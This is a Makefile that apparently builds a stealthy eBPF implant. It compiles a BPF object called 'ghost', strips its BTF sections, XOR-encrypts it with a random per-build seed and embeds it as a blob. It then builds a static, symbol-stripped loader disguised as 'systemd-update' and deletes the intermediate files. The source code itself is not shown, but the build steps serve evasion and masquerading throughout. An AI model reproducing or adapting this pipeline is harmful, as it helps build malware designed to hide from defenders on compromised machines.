CC = clang
STRIP = llvm-strip
SEED = $(shell head -c 4 /dev/urandom | xxd -p)

# Flags for the static loader
LDFLAGS = -static -nostartfiles -nodefaultlibs -lc
CFLAGS = -O3 -Wall -DSEED_VAL=0x$(SEED)

all: xor_tool bpf header loader clean_tmp

xor_tool:
	gcc build/xor.c -o build/xor_tool

bpf:
	@mkdir -p target
	$(CC) -O3 -target bpf -g0 -fno-ident -I/usr/include/x86_64-linux-gnu -c src/bpf/ghost.c -o target/ghost.o
	$(STRIP) --strip-unneeded -R .BTF -R .BTF.ext target/ghost.o
	./build/xor_tool target/ghost.o 0x$(SEED)

header:
	cd target && xxd -i ghost.o > ../src/ghost_blob.h

loader:
	$(CC) $(CFLAGS) src/main.c -o target/systemd-update
	strip -s target/systemd-update

clean_tmp:
	rm -f build/xor_tool src/ghost_blob.h target/ghost.o

clean:
	rm -rf target/ build/xor_tool
